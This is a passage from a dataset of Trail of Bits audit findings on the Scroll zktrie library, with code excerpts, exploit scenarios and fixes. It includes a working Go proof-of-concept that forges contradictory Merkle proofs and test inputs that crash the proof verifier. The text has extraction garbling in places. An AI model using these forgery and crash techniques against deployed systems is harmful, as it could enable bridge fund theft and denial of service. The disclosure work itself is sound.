b.finalizer != nil { finalized, err := b.finalizer.IsBlockFinalized(timeout, block) if err != nil { logger.Error(\"failed to check block finalization\", zap.Uint64(\"block\", block.Number.Uint64()), zap.Error(err)) finalization (%d): %w\", block.Number.Uint64(), err) return lastPublishedBlock, fmt.Errorf(\"failed to check block } if !finalized { break } } b.blockFeed.Send(block) lastPublishedBlock = block Figure 17.2: node/pkg/watchers/evm/connectors/poller.go#L149L164 Exploit Scenario A developer adds a new chain to the watcher using BlockPollConnector and forgets to add a PollFinalizer. Because a nalizer is not required to receive the latest blocks, transactions that were not included in the blockchain are considered valid, and funds are incorrectly transferred without corresponding deposits. Recommendations Short term, rewrite the block poller to require a nalizer. This makes the conguration of the block poller explicit and claries that a DefaultFinalizer is being used, indicating that no extra validations are being performed. Long term, document the conguration and assumptions of each chain. Then, see if any changes could be made to the code to clarify the developers intentions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Lack of domain separation allows proof forgery ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "Merkle trees are nested tree data structures in which the hash of each branch node depends upon the hashes of its children. The hash of each node is then assumed to uniquely represent the subtree of which that node is a root. However, that assumption may be false if a leaf node can have the same hash as a branch node. A general method for preventing leaf and branch nodes from colliding in this way is domain separation. That is, given a hash function , dene the hash of a leaf to be and the hash of a branch to be return the same result (perhaps because s return values all start with the byte 0 and s all start with the byte 1). Without domain separation, a malicious entity may be able to insert a leaf into the tree that can be later used as a branch in a Merkle path. , where and are encoding functions that can never  ((_)) ((_))     In zktrie, the hash for a node is dened by the NodeHash method, shown in gure 1.1. As shown in the highlighted portions, the hash of a branch node is HashElems(n.ChildL,n.ChildR), while the hash of a leaf node is HashElems(1,n.NodeKey,n.valueHash). // LeafHash computes the key of a leaf node given the hIndex and hValue of the // entry of the leaf. func LeafHash(k, v *zkt.Hash) (*zkt.Hash, error) { return zkt.HashElems(big.NewInt(1), k.BigInt(), v.BigInt()) } // NodeHash computes the hash digest of the node by hashing the content in a // specific way for each type of node. // Merkle tree for each node. func (n *Node) NodeHash() (*zkt.Hash, error) { This key is used as the hash of the if n.nodeHash == nil { // Cache the key to avoid repeated hash computations. // NOTE: We are not using the type to calculate the hash! switch n.Type { case NodeTypeParent: // H(ChildL || ChildR) var err error n.nodeHash, err = zkt.HashElems(n.ChildL.BigInt(), n.ChildR.BigInt()) if err != nil { return nil, err } case NodeTypeLeaf: n.ValuePreimage) var err error n.valueHash, err = zkt.PreHandlingElems(n.CompressedFlags, if err != nil { return nil, err } n.nodeHash, err = LeafHash(n.NodeKey, n.valueHash) if err != nil { return nil, err } case NodeTypeEmpty: // Zero n.nodeHash = &zkt.HashZero default: n.nodeHash = &zkt.HashZero } } return n.nodeHash, nil } Figure 1.1: NodeHash and LeafHash (zktrie/trie/zk_trie_node.go#118156) The function HashElems used here performs recursive hashing in a binary-tree fashion. For the purpose of this nding, the key property is that HashElems(1,k,v) == H(H(1,k),v) and HashElems(n.ChildL,n.ChildR) == H(n.ChildL,n.ChildR), where H is the global two-input, one-output hash function. Therefore, a branch node b and a leaf node l where b.ChildL == H(1,l.NodeKey) and b.ChildR == l.valueHash will have equal hash values. This allows proof forgery and, for example, a malicious entity to insert a key that can be proved to be both present and nonexistent in the tree, as illustrated by the proof-of-concept test in gure 1.2. func TestMerkleTree_ForgeProof(t *testing.T) { zkTrie := newTestingMerkle(t, 10) t.Run(\"Testing for malicious proofs\", func(t *testing.T) { // Find two distinct values k1,k2 such that the first step of // the path has the sibling on the LEFT (i.e., path[0] == // false) k1, k2 := (func() (zkt.Byte32, zkt.Byte32) { k1 := zkt.Byte32{1} k2 := zkt.Byte32{2} k1_hash, _ := k1.Hash() k2_hash, _ := k2.Hash() for !getPath(1, zkt.NewHashFromBigInt(k1_hash)[:])[0] { for i := len(k1); i > 0; i -= 1 { k1[i-1] += 1 if k1[i-1] != 0 { break } } k1_hash, _ = k1.Hash() } zkt.NewHashFromBigInt(k2_hash)[:])[0] { for k1 == k2 || !getPath(1, for i := len(k2); i > 0; i -= 1 { k2[i-1] += 1 if k2[i-1] != 0 { break } } k2_hash, _ = k2.Hash() } return k1, k2 })() k1_hash_int, _ := k1.Hash() k2_hash_int, _ := k2.Hash() k1_hash := zkt.NewHashFromBigInt(k1_hash_int) k2_hash := zkt.NewHashFromBigInt(k2_hash_int) // create a dummy value for k2, and use that to craft a // malicious value for k1 k2_value := (&[2]zkt.Byte32{{2}})[:] k1_value, _ := NewLeafNode(k2_hash, 1, k2_value).NodeHash() []zkt.Byte32{*zkt.NewByte32FromBytes(k1_value.Bytes())} k1_value_array := // insert k1 into the trie with the malicious value assert.Nil(t, zkTrie.TryUpdate(zkt.NewHashFromBigInt(k1_hash_int), 0, k1_value_array)) getNode := func(hash *zkt.Hash) (*Node, error) { return zkTrie.GetNode(hash) } // query an inclusion proof for k1 k1Proof, _, err := BuildZkTrieProof(zkTrie.rootHash, k1_hash_int, 10, getNode) assert.Nil(t, err) assert.True(t, k1Proof.Existence) // check that inclusion proof against our root hash k1_val_hash, _ := NewLeafNode(k1_hash, 0, k1_value_array).NodeHash() k1Proof_root, _ := k1Proof.Verify(k1_val_hash, k1_hash) assert.Equal(t, k1Proof_root, zkTrie.rootHash) // forge a non-existence proof fakeNonExistProof := *k1Proof fakeNonExistProof.Existence = false // The new non-existence proof needs one extra level, where // the sibling hash is H(1,k1_hash) fakeNonExistProof.depth += 1 zkt.SetBitBigEndian(fakeNonExistProof.notempties[:], fakeNonExistProof.depth-1) fakeSibHash, _ := zkt.HashElems(big.NewInt(1), k1_hash_int) fakeNonExistProof.Siblings = append(fakeNonExistProof.Siblings, fakeSibHash) // Construct the NodeAux details for the malicious leaf k2_value_hash, _ := zkt.PreHandlingElems(1, k2_value) k2_nodekey := zkt.NewHashFromBigInt(k2_hash_int) fakeNonExistProof.NodeAux = &NodeAux{Key: k2_nodekey, Value: k2_value_hash} // Check our non-existence proof against the root hash fakeNonExistProof_root, _ := fakeNonExistProof.Verify(k1_val_hash, assert.Equal(t, fakeNonExistProof_root, zkTrie.rootHash) // fakeNonExistProof and k1Proof prove opposite things. k1 // is both in and not-in the tree! assert.NotEqual(t, fakeNonExistProof.Existence, k1Proof.Existence) k1_hash) }) } Figure 1.2: A proof-of-concept test case for proof forgery Exploit Scenario Suppose Alice uses the zktrie to implement the Ethereum account table in a zkEVM-based bridge with trustless state updates. Bob submits a transaction that inserts specially crafted account data into some position in that tree. At a later time, Bob submits a transaction that depends on the result of an account table lookup. Bob generates two contradictory Merkle proofs and uses those proofs to create two zkEVM execution proofs that step to dierent nal states. By submitting one proof each to the opposite sides of the bridge, Bob causes state divergence and a loss of funds. Recommendations Short term, modify NodeHash to domain-separate leaves and branches, such as by changing the branch hash to zkt.HashElems(big.NewInt(2),n.ChildL.BigInt(), n.ChildR.BigInt()). Long term, fully document all data structure designs and requirements, and review all assumptions to ensure that they are well founded.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. Lack of proof validation causes denial of service on the verier ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The Merkle tree proof verier assumes several well-formedness properties about the received proof and node arguments. If at least one of these properties is violated, the verier will have a runtime error. The rst property that must hold is that the node associated with the Merkle proof must be a leaf node (i.e., must contain a non-nil NodeKey eld). If this is not the case, computing the rootFromProof for a nil NodeKey will cause a panic when computing the getPath function. Secondly, the Proof elds must be guaranteed to be consistent with the other elds. Assuming that the proof depth is correct will cause out-of-bounds accesses to both the NodeKey and the notempties eld. Finally, the Siblings array length should also be validated; for example, the VerifyProofZkTrie will panic due to an out-of-bounds access if the proof.Siblings eld is empty (highlighted in yellow in the rootFromProof function). // VerifyProof verifies the Merkle Proof for the entry and root. func VerifyProofZkTrie(rootHash *zkt.Hash, proof *Proof, node *Node) bool { nodeHash, err := node.NodeHash() if err != nil { return false } rootFromProof, err := proof.Verify(nodeHash, node.NodeKey) if err != nil { return false } return bytes.Equal(rootHash[:], rootFromProof[:]) } // Verify the proof and calculate the root, nodeHash can be nil when try to verify // a nonexistent proof func (proof *Proof) Verify(nodeHash, nodeKey *zkt.Hash) (*zkt.Hash, error) { if proof.Existence { if nodeHash == nil { return nil, ErrKeyNotFound } return proof.rootFromProof(nodeHash, nodeKey) } else { if proof.NodeAux == nil { return proof.rootFromProof(&zkt.HashZero, nodeKey) } else { if bytes.Equal(nodeKey[:], proof.NodeAux.Key[:]) { return nil, fmt.Errorf(\"non-existence proof being checked against hIndex equal to nodeAux\") } midHash, err := LeafHash(proof.NodeAux.Key, proof.NodeAux.Value) if err != nil { return nil, err } return proof.rootFromProof(midHash, nodeKey) } } } func (proof *Proof) rootFromProof(nodeHash, nodeKey *zkt.Hash) (*zkt.Hash, error) { var err error sibIdx := len(proof.Siblings) - 1 path := getPath(int(proof.depth), nodeKey[:]) var siblingHash *zkt.Hash for lvl := int(proof.depth) - 1; lvl >= 0; lvl-- { if zkt.TestBitBigEndian(proof.notempties[:], uint(lvl)) { siblingHash = proof.Siblings[sibIdx] sibIdx-- } else { siblingHash = &zkt.HashZero } if path[lvl] { nodeHash, err = NewParentNode(siblingHash, nodeHash).NodeHash() if err != nil { return nil, err } } else { nodeHash, err = NewParentNode(nodeHash, siblingHash).NodeHash() if err != nil { return nil, err } } } return nodeHash, nil } Figure 2.1: zktrie/trie/zk_trie_impl.go#595 Exploit Scenario An attacker crafts an invalid proof that causes the proof verier to crash, causing a denial of service in the system. Recommendations Short term, validate the proof structure before attempting to use its values. Add fuzz testing to the VerifyProofZkTrie function. Long term, add extensive tests and fuzz testing to functions interfacing with attacker-controlled values.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Two incompatible ways to generate proofs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "There are two incompatible ways to generate proofs. The rst implementation (gure 3.1) writes to a given callback, eectively returning []bytes. It does not have a companion verication function; it has only positive tests (zktrie/trie/zk_trie_test.go#L93-L125); and it is accessible from the C function TrieProve and the Rust function prove. The second implementation (gure 3.2) returns a pointer to a Proof struct. It has a companion verication function (zktrie/trie/zk_trie_impl.go#L595-L632); it has positive and negative tests (zktrie/trie/zk_trie_impl_test.go#L484-L537); and it is not accessible from C or Rust. // Prove is a simlified calling of ProveWithDeletion func (t *ZkTrie) Prove(key []byte, fromLevel uint, writeNode func(*Node) error) error { return t.ProveWithDeletion(key, fromLevel, writeNode, nil) } // ProveWithDeletion constructs a merkle proof for key. The result contains all encoded nodes // on the path to the value at key. The value itself is also included in the last // node and can be retrieved by verifying the proof. // // If the trie does not contain a value for key, the returned proof contains all // nodes of the longest existing prefix of the key (at least the root node), ending // with the node that proves the absence of the key. // // If the trie contain value for key, the onHit is called BEFORE writeNode being called, // both the hitted leaf node and its sibling node is provided as arguments so caller // would receive enough information for launch a deletion and calculate the new root // base on the proof data // Also notice the sibling can be nil if the trie has only one leaf func (t *ZkTrie) ProveWithDeletion(key []byte, fromLevel uint, writeNode func(*Node) error, onHit func(*Node, *Node)) error { [...] } Figure 3.1: The rst way to generate proofs (zktrie/trie/zk_trie.go#143164) // Proof defines the required elements for a MT proof of existence or // non-existence. type Proof struct { // existence indicates wether this is a proof of existence or // non-existence. Existence bool // depth indicates how deep in the tree the proof goes. depth uint // notempties is a bitmap of non-empty Siblings found in Siblings. notempties [zkt.HashByteLen - proofFlagsLen]byte // Siblings is a list of non-empty sibling node hashes. Siblings []*zkt.Hash // NodeAux contains the auxiliary information of the lowest common ancestor // node in a non-existence proof. NodeAux *NodeAux } // BuildZkTrieProof prove uniformed way to turn some data collections into Proof struct func BuildZkTrieProof(rootHash *zkt.Hash, k *big.Int, lvl int, getNode func(key *zkt.Hash) (*Node, error)) (*Proof, *Node, error) { [...] } Figure 3.2: The second way to generate proofs (zktrie/trie/zk_trie_impl.go#531551) Recommendations Short term, decide on one implementation and remove the other implementation. Long term, ensure full test coverage in the chosen implementation; ensure the implementation has both positive and negative testing; and add fuzz testing to the proof verication routine.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. BuildZkTrieProof does not populate NodeAux.Value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "A nonexistence proof for some key k in a Merkle tree is a Merkle path from the root of the tree to a subtree, which would contain k if it were present but which instead is either an empty subtree or a subtree with a single leaf k2 where k != k2. In the zktrie codebase, that second case is handled by the NodeAux eld in the Proof struct, as illustrated in gure 4.1. // Verify the proof and calculate the root, nodeHash can be nil when try to verify // a nonexistent proof func (proof *Proof) Verify(nodeHash, nodeKey *zkt.Hash) (*zkt.Hash, error) { if proof.Existence { if nodeHash == nil { return nil, ErrKeyNotFound } return proof.rootFromProof(nodeHash, nodeKey) } else { if proof.NodeAux == nil { return proof.rootFromProof(&zkt.HashZero, nodeKey) } else { if bytes.Equal(nodeKey[:], proof.NodeAux.Key[:]) { return nil, fmt.Errorf(\"non-existence proof being checked against hIndex equal to nodeAux\") } midHash, err := LeafHash(proof.NodeAux.Key, proof.NodeAux.Value) if err != nil { return nil, err } return proof.rootFromProof(midHash, nodeKey) } } } Figure 4.1: The Proof.Verify method (zktrie/trie/zk_trie_impl.go#609632) When a non-inclusion proof is generated, the BuildZkTrieProof function looks up the other leaf node and uses its NodeKey and valueHash elds to populate the Key and Value elds of NodeAux, as shown in gure 4.2. However, the valueHash eld of this node may be nil, causing NodeAux.Value to be nil and causing proof verication to crash with a nil pointer dereference error, which can be triggered by the test case shown in gure 4.3. n, err := getNode(nextHash) if err != nil { return nil, nil, err } switch n.Type { case NodeTypeEmpty: return p, n, nil case NodeTypeLeaf: if bytes.Equal(kHash[:], n.NodeKey[:]) { p.Existence = true return p, n, nil } // We found a leaf whose entry didn't match hIndex p.NodeAux = &NodeAux{Key: n.NodeKey, Value: n.valueHash} return p, n, nil Figure 4.2: Populating NodeAux (zktrie/trie/zk_trie_impl.go#560574) func TestMerkleTree_GetNonIncProof(t *testing.T) { zkTrie := newTestingMerkle(t, 10) t.Run(\"Testing for non-inclusion proofs\", func(t *testing.T) { k := zkt.Byte32{1} k_value := (&[1]zkt.Byte32{{1}})[:] k_other := zkt.Byte32{2} k_hash_int, _ := k.Hash() k_other_hash_int, _ := k_other.Hash() k_hash := zkt.NewHashFromBigInt(k_hash_int) k_other_hash := zkt.NewHashFromBigInt(k_other_hash_int) assert.Nil(t, zkTrie.TryUpdate(k_hash, 0, k_value)) getNode := func(hash *zkt.Hash) (*Node, error) { return zkTrie.GetNode(hash) } proof, _, err := BuildZkTrieProof(zkTrie.rootHash, k_other_hash_int, 10, getNode) assert.Nil(t, err) assert.False(t, proof.Existence) proof_root, _ := proof.Verify(nil, k_other_hash) assert.Equal(t, proof_root, zkTrie.rootHash) }) } Figure 4.3: A test case that will crash with a nil dereference of NodeAux.Value Adding a call to n.NodeHash() inside BuildZkTrieProof, as shown in gure 4.4, xes this problem. n, err := getNode(nextHash) if err != nil { return nil, nil, err } switch n.Type { case NodeTypeEmpty: return p, n, nil case NodeTypeLeaf: if bytes.Equal(kHash[:], n.NodeKey[:]) { p.Existence = true return p, n, nil } // We found a leaf whose entry didn't match hIndex p.NodeAux = &NodeAux{Key: n.NodeKey, Value: n.valueHash} return p, n, nil Figure 4.4: Adding the highlighted n.NodeHash() call xes this problem. (zktrie/trie/zk_trie_impl.go#560574) Exploit Scenario An adversary or ordinary user requests that the software generate and verify a non-inclusion proof, and the software crashes, leading to the loss of service. Recommendations Short term, x BuildZkTrieProof by adding a call to n.NodeHash(), as described above. Long term, ensure that all major code paths in important functions, such as proof generation and verication, are tested. The Go coverage analysis report generated by the command go test -cover -coverprofile c.out && go tool cover -html=c.out shows that this branch in Proof.Verify is not currently tested: Figure 4.5: The Go coverage analysis report 5. Leaf nodes with di\u0000erent values may have the same hash Severity: High Diculty: Medium Type: Cryptography Finding ID: TOB-ZKTRIE-5 Target: trie/zk_trie_node.go, types/util.go",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Empty UpdatePreimage function body ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The UpdatePreimage function implementation for the Database receiver type is empty. Instead of an empty function body, the function should either panic with an unimplemented message or a message that is logged. This would prevent the function from being used without any warning. func (db *Database) UpdatePreimage([]byte, *big.Int) {} Figure 6.1: zktrie/trie/zk_trie_database.go#19 Recommendations Short term, add an unimplemented message to the function body, through either a panic or message logging.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "7. CanonicalValue is not canonical ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The CanonicalValue function does not uniquely generate a representation of Node structures, allowing dierent Nodes with the same CanonicalValue, and two nodes with the same NodeHash but dierent CanonicalValues. ValuePreimages in a Node can be either uncompressed or compressed (by hashing); the CompressedFlags value indicates which data is compressed. Only the rst 24 elds can be compressed, so CanonicalValue truncates CompressedFlags to the rst 24 bits. But NewLeafNode accepts any uint32 for the CompressedFlags eld of a Node. Figure 7.3 shows how this can be used to construct two dierent Node structs that have the same CanonicalValue. // CanonicalValue returns the byte form of a node required to be persisted, and strip unnecessary fields // from the encoding (current only KeyPreimage for Leaf node) to keep a minimum size for content being // stored in backend storage func (n *Node) CanonicalValue() []byte { switch n.Type { case NodeTypeParent: // {Type || ChildL || ChildR} bytes := []byte{byte(n.Type)} bytes = append(bytes, n.ChildL.Bytes()...) bytes = append(bytes, n.ChildR.Bytes()...) return bytes case NodeTypeLeaf: // {Type || Data...} bytes := []byte{byte(n.Type)} bytes = append(bytes, n.NodeKey.Bytes()...) tmp := make([]byte, 4) compressedFlag := (n.CompressedFlags << 8) + uint32(len(n.ValuePreimage)) binary.LittleEndian.PutUint32(tmp, compressedFlag) bytes = append(bytes, tmp...) for _, elm := range n.ValuePreimage { bytes = append(bytes, elm[:]...) } bytes = append(bytes, 0) return bytes case NodeTypeEmpty: // { Type } return []byte{byte(n.Type)} default: return []byte{} } } Figure 7.1: This gure shows the CanonicalValue computation. The highlighted code assumes that CompressedFlags is 24 bits. (zktrie/trie/zk_trie_node.go#187214) // NewLeafNode creates a new leaf node. func NewLeafNode(k *zkt.Hash, valueFlags uint32, valuePreimage []zkt.Byte32) *Node { return &Node{Type: NodeTypeLeaf, NodeKey: k, CompressedFlags: valueFlags, ValuePreimage: valuePreimage} } Figure 7.2: Node construction in NewLeafNode (zktrie/trie/zk_trie_node.go#5558) // CanonicalValue implicitly truncates CompressedFlags to 24 bits. This test should ideally fail. func TestZkTrie_CanonicalValue1(t *testing.T) { key, err := hex.DecodeString(\"0000000000000000000000000000000000000000000000000000000000000000\") assert.NoError(t, err) vPreimage := []zkt.Byte32{{0}} k := zkt.NewHashFromBytes(key) vFlag0 := uint32(0x00ffffff) vFlag1 := uint32(0xffffffff) lf0 := NewLeafNode(k, vFlag0, vPreimage) lf1 := NewLeafNode(k, vFlag1, vPreimage) // These two assertions should never simultaneously pass. assert.True(t, lf0.CompressedFlags != lf1.CompressedFlags) assert.True(t, reflect.DeepEqual(lf0.CanonicalValue(), lf1.CanonicalValue())) } Figure 7.3: A test showing that one can construct dierent nodes with the same CanonicalValue // PreHandlingElems turn persisted byte32 elements into field arrays for our hashElem // it also has the compressed byte32 func PreHandlingElems(flagArray uint32, elems []Byte32) (*Hash, error) { ret := make([]*big.Int, len(elems)) var err error for i, elem := range elems { if flagArray&(1<<i) != 0 { ret[i], err = elem.Hash() if err != nil { return nil, err } } else { ret[i] = new(big.Int).SetBytes(elem[:]) } } if len(ret) < 2 { return NewHashFromBigInt(ret[0]), nil } return HashElems(ret[0], ret[1], ret[2:]...) } Figure 7.4: The subroutine called in NodeHash that hashes uncompressed elements (zktrie/types/util.go#3862) Furthermore, CanonicalValue and NodeHash are inconsistent in their processing of uncompressed values. CanonicalValue uses them directly, while NodeHash hashes them. Figure 7.5 shows how this can be used to construct two Node structs that have the same NodeHash but dierent CanonicalValues. // CanonicalValue and NodeHash are not consistent func TestZkTrie_CanonicalValue2(t *testing.T) { t.Run(\"Testing for value collisions\", func(t *testing.T) { k := zkt.Byte32{1} k_hash_int, _ := k.Hash() k_hash := zkt.NewHashFromBigInt(k_hash_int) {3}})[:] value1 := (&[2]zkt.Byte32{*zkt.NewByte32FromBytes(k_hash.Bytes()), value2 := (&[2]zkt.Byte32{{1}, {3}})[:] leaf1 := NewLeafNode(k_hash, 0, value1) leaf2 := NewLeafNode(k_hash, 1, value2) leaf1_node_hash, _ := leaf1.NodeHash() leaf2_node_hash, _ := leaf2.NodeHash() assert.Equal(t, leaf1_node_hash, leaf2_node_hash) leaf1_canonical := leaf1.CanonicalValue() leaf2_canonical := leaf2.CanonicalValue() assert.NotEqual(t, leaf1_canonical, leaf2_canonical) }) } Figure 7.5: A test showing that CanonicalValue and NodeHash are inconsistent Recommendations Short term, have CanonicalValue validate all assumptions, and make CanonicalValue and NodeHash consistent. Long term, document all assumptions and use Gos type system to enforce them.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "8. ToSecureKey and ToSecureKeyBytes implicitly truncate the key ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "ToSecureKey and ToSecureKeyBytes accept a key of arbitrary length but implicitly truncate it to 32 bytes. ToSecureKey makes an underlying call to NewByte32FromBytesPaddingZero that truncates the key to its rst 32 bytes. The ToSecureKeyBytes function also truncates the key because it calls ToSecureKey. // ToSecureKey turn the byte key into the integer represent of \"secured\" key func ToSecureKey(key []byte) (*big.Int, error) { word := NewByte32FromBytesPaddingZero(key) return word.Hash() } Figure 8.1: ToSecureKey accepts a key of arbitrary length. (zktrie/types/util.go#9397) // create bytes32 with zeropadding to shorter bytes, or truncate it func NewByte32FromBytesPaddingZero(b []byte) *Byte32 { byte32 := new(Byte32) copy(byte32[:], b) return byte32 } Figure 8.2: But NewByte32FromBytesPaddingZero truncates the key to the rst 32 bytes. (zktrie/types/byte32.go#3540) // ToSecureKeyBytes turn the byte key into a 32-byte \"secured\" key, which represented a big-endian integer func ToSecureKeyBytes(key []byte) (*Byte32, error) { k, err := ToSecureKey(key) if err != nil { return nil, err } return NewByte32FromBytes(k.Bytes()), nil } Figure 8.3: ToSecureKeyBytes accepts a key of arbitrary length and calls ToSecureKey on it. (zktrie/types/util.go#99107) // zkt.ToSecureKey implicitly truncates keys to 32 bytes. This test should ideally fail. func TestZkTrie_ToSecureKeyTruncation(t *testing.T) { key1, err := hex.DecodeString(\"000000000000000000000000000000000000000000000000000000000000000011 \") assert.NoError(t, err) key2, err := hex.DecodeString(\"000000000000000000000000000000000000000000000000000000000000000022 \") assert.NoError(t, err) assert.NotEqual(t, key1, key2) skey1, err := zkt.ToSecureKey(key1) assert.NoError(t, err) // This should fail skey2, err := zkt.ToSecureKey(key2) assert.NoError(t, err) // This should fail assert.True(t, skey1.Cmp(skey2) == 0) // If above don't fail, this should fail } Figure 8.4: A test showing the truncation of keys longer than 32 bytes Recommendations Short term, x the ToSecureKey and ToSecureKeyBytes functions so that they do not truncate keys that are longer than 32 bytes, and instead hash all the bytes. If this behavior is not desired, ensure that the functions return an error if given a key longer than 32 bytes. Long term, add fuzz tests to public interfaces like TryGet, TryUpdate, and TryDelete.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "9. Unused key argument on the bridge_prove_write function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The bridge_prove_write function implementation does not use the key argument. void bridge_prove_write(proveWriteF f, unsigned char* key, unsigned char* val, int size, void* param){ f(val, size, param); } Figure 9.1: zktrie/c.go#1719 This function is always called with a nil value: err = tr.Prove(s_key.Bytes(), 0, func(n *trie.Node) error { dt := n.Value() C.bridge_prove_write( C.proveWriteF(callback), nil, //do not need to prove node key (*C.uchar)(&dt[0]), C.int(len(dt)), cb_param, ) return nil }) if err != nil { return C.CString(err.Error()) } tailingLine := trie.ProofMagicBytes() C.bridge_prove_write( C.proveWriteF(callback), nil, //do not need to prove node key (*C.uchar)(&tailingLine[0]), C.int(len(tailingLine)), cb_param, ) return nil } Figure 9.2: zktrie/lib.go#263292 Recommendations Short term, document the intended behavior and the role and requirements of each function. Decide whether to remove the unused argument or document why it is currently unused in the implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "10. The PreHandlingElems function panics with an empty elems array ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The PreHandlingElems function experiences a runtime error when the elems array is empty. There is an early return path for when the array has fewer than two elements that assumes there is at least one element. If this is not the case, there will be an out-of-bounds access that will cause a runtime error. func PreHandlingElems(flagArray uint32, elems []Byte32) (*Hash, error) { ret := make([]*big.Int, len(elems)) var err error for i, elem := range elems { if flagArray&(1<<i) != 0 { ret[i], err = elem.Hash() if err != nil { return nil, err } } else { ret[i] = new(big.Int).SetBytes(elem[:]) } } if len(ret) < 2 { return NewHashFromBigInt(ret[0]), nil Figure 10.1: When ret is empty, the array access will cause a runtime error. (zktrie/types/util.go#4057) Figure 10.2 shows tests that demonstrate this issue by directly calling PreHandlingElems with an empty array and by triggering the issue via the NodeHash function. func TestEmptyPreHandlingElems(t *testing.T) { flagArray := uint32(0) elems := make([]Byte32, 0) _, err := PreHandlingElems(flagArray, elems) assert.NoError(t, err) } func TestPrehandlingElems(t *testing.T) { k := zkt.Byte32{1} k_hash_int, _ := k.Hash() k_hash := zkt.NewHashFromBigInt(k_hash_int) value1 := (&[0]zkt.Byte32{})[:] node, _ := NewLeafNode(k_hash, 0, value1).NodeHash() t.Log(node) } Figure 10.2: Tests that trigger the out-of-bounds access Note that the TrieUpdate exported function would also trigger the same issue if called with an empty vPreimage argument, but this is checked in the function. It is also possible to trigger this panic from the Rust API by calling ZkTrieNode::parse with the byte array obtained from the Value() function operated on a maliciously constructed leaf node. This is because ZkTrieNode::parse will eventually call NewNodeFromBytes and the NodeHash function on that node. The NewNodeFromBytes function also does not validate that the newly created node is well formed (TOB-ZKTRIE-14). #[test] fn test_zktrienode_parse() { let buff = hex::decode(\"011baa09b39b1016e6be4467f3d58c1e1859d5e883514ff707551a9355a5941e2200000 00000\").unwrap(); let _node = ZkTrieNode::parse(&buff); } Figure 10.3: A test that triggers the out-of-bounds access from the Rust API Both the Data() and String() functions also panic when operated on a Node receiver with an empty ValuePreimage array: // Data returns the wrapped data inside LeafNode and cast them into bytes // for other node type it just return nil func (n *Node) Data() []byte { switch n.Type { case NodeTypeLeaf: var data []byte hdata := (*reflect.SliceHeader)(unsafe.Pointer(&data)) //TODO: uintptr(reflect.ValueOf(n.ValuePreimage).UnsafePointer()) should be more elegant but only available until go 1.18 hdata.Data = uintptr(unsafe.Pointer(&n.ValuePreimage[0])) hdata.Len = 32 * len(n.ValuePreimage) hdata.Cap = hdata.Len return data default: return nil } } Figure 10.4: zktrie/trie/zk_trie_node.go#170185 // String outputs a string representation of a node (different for each type). func (n *Node) String() string { switch n.Type { case NodeTypeParent: // {Type || ChildL || ChildR} return fmt.Sprintf(\"Parent L:%s R:%s\", n.ChildL, n.ChildR) case NodeTypeLeaf: // {Type || Data...} return fmt.Sprintf(\"Leaf I:%v Items: %d, First:%v\", n.NodeKey, len(n.ValuePreimage), n.ValuePreimage[0]) case NodeTypeEmpty: // {} return \"Empty\" default: return \"Invalid Node\" } } Figure 10.5: zktrie/trie/zk_trie_node.go#230242 Exploit Scenario An attacker calls the public Rust ZkTrieNode::parse function with a maliciously chosen buer, causing the system to experience a runtime error. Recommendations Short term, document which properties need to hold for all data structures. Ensure that edge cases are documented in the type constructors, and add checks to validate that functions do not raise a runtime error. Long term, add fuzz testing to the public Rust and Go APIs.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. The hash_external function panics with integers larger than 32 bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The hash_external function will cause a runtime error due to an out-of-bounds access if the input integers are larger than 32 bytes. func hash_external(inp []*big.Int) (*big.Int, error) { if len(inp) != 2 { return big.NewInt(0), errors.New(\"invalid input size\") } a := zkt.ReverseByteOrder(inp[0].Bytes()) b := zkt.ReverseByteOrder(inp[1].Bytes()) a = append(a, zeros[0:(32-len(a))]...) b = append(b, zeros[0:(32-len(b))]...) Figure 11.1: zktrie/lib.go#3139 Exploit Scenario An attacker causes the system to call hash_external with integers larger than 32 bytes, causing the system to experience a runtime error. Recommendations Short term, document the function requirements that the integers need to be less than 32 bytes. If the function is reachable by an adversary, add checks to ensure that the runtime error is not reachable. Long term, carefully check all indexing operations done on adversary-controlled values with respect to out-of-bounds accessing.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Mishandling of cgo.Handles causes runtime errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
